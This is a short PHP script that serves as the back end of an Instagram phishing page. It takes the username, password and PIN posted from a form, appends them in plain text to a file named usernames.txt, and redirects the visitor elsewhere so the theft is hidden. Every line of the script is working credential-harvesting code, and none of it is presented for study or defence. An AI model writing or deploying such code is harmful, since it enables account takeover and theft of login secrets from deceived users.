<?php
file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . " Pin: " . $_POST['pin'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://skweezer.net
header("Location: $url");
exit();
?>